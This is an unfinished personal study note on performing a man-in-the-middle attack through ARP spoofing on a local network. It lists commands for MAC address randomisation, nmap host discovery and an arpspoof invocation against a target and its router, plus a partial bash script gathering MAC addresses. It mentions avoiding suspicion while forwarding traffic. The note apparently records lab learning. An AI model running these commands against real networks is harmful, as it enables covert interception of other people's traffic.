# TODO - Man in the Middle with ARP spoofing

Welcome again :D&#x20;

Im actually pleased of myself because Im explaining to me and Im actually understanding something LOL

## Recap

### change the MAC

```
sudo macchanger -r eth0 
```

### reverse DNS request to get all the hostname

and find the target

```
nmap -sL 192.168.1.0/24
# -sL     reverse DNS resolution (send no packet to the host, 
                only to the DNS server probably)
```

### check if host is alive

{% embed url="https://security.stackexchange.com/questions/36198/how-to-find-live-hosts-on-my-network" %}

```
nmap -sn 192.168.1.68

# -sn     disable port scan
# -sn is the same as -sP and does NOT work all the time
```

### ARP spoofing

```
sudo arpspoof -i eth0 -t 192.168.1.68 -r 192.168.1.1 
```

Now we need not to arouse suspicion

## Packet redirect

Now a method is needed to be able to not block the connection of the target host with the router.

## MAC forwarding

As if we were switches we could use MAC addresses to forward data at the data link layer (layer 2) of the OSI model.&#x20;

A script could be useful.

```
./basic_mitm 192.168.1.68 192.168.1.1
```

<details>

<summary>first thing is to gather the MAC addresses</summary>

```bash
#!/bin/bash

echo "$1"
echo "$2"

mac1=$(sudo nmap -nsP "$1" | grep MAC | awk -F\  ' { print $3 } ' )
mac2=$(sudo nmap -nsP "$2" | grep MAC | awk -F\  ' { print $3 } ' )

echo "$mac1"
echo "$mac2"
```

```
-R     Never do DNS resolution
-sn    Ping Scan - disable port scan
```

</details>

{% embed url="https://serverfault.com/questions/293786/is-there-a-tool-like-route-in-linux-to-configure-the-forwarding-entry-dst-mac" %}

{% embed url="https://en.wikipedia.org/wiki/MAC-Forced_Forwarding" %}

{% embed url="https://linux.die.net/man/8/iptables" %}

{% hint style="info" %}
iptables command has a "mac" section that could be useful
{% endhint %}

## Sources

{% embed url="https://www.cyberciti.biz/tips/iptables-mac-address-filtering.html" %}

{% embed url="https://explainshell.com/explain?cmd=nmap+-sP" %}
